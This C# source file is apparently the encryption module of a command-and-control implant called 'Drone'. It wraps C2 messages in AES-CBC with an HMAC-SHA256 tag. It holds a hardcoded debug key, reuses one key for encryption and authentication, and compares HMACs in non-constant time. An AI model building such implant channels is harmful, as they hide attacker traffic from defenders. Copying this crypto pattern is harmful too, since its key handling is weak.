using System;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

using Drone.Models;

namespace Drone
{
    public class Crypto
    {
        public MessageEnvelope EncryptMessage(C2Message message)
        {
            var envelope = new MessageEnvelope();
            var raw = message.Serialize();

            using var aes = Aes.Create();
            aes.Mode = CipherMode.CBC;
            aes.Key = Key;
            aes.GenerateIV();

            using var cryptoTransform = aes.CreateEncryptor();
            envelope.IvBytes = aes.IV;
            envelope.DataBytes = cryptoTransform.TransformFinalBlock(raw, 0, raw.Length);
            envelope.HmacBytes = CalculateHmac(envelope.DataBytes);

            return envelope;
        }

        public C2Message DecryptEnvelope(MessageEnvelope envelope)
        {
            if (!ValidHmac(envelope))
                throw new Exception("Invalid HMAC");

            using var aes = Aes.Create();
            aes.Mode = CipherMode.CBC;
            aes.Key = Key;
            aes.IV = envelope.IvBytes;

            using var cryptoTransform = aes.CreateDecryptor();
            var dec = cryptoTransform.TransformFinalBlock(envelope.DataBytes, 0, envelope.DataBytes.Length);

            return dec.Deserialize<C2Message>();
        }

        private byte[] CalculateHmac(byte[] data)
        {
            using var hmac = new HMACSHA256(Key);
            return hmac.ComputeHash(data);
        }

        private bool ValidHmac(MessageEnvelope envelope)
        {
            var calculated = CalculateHmac(envelope.DataBytes);
            return calculated.SequenceEqual(envelope.HmacBytes);
        }

#if DEBUG
        private static byte[] Key => Encoding.UTF8.GetBytes("bmihRwRyhdfwGCa!VJ!97f6tGWPxXD&m");
#else
        private static byte[] Key => Convert.FromBase64String("");
#endif
    }
}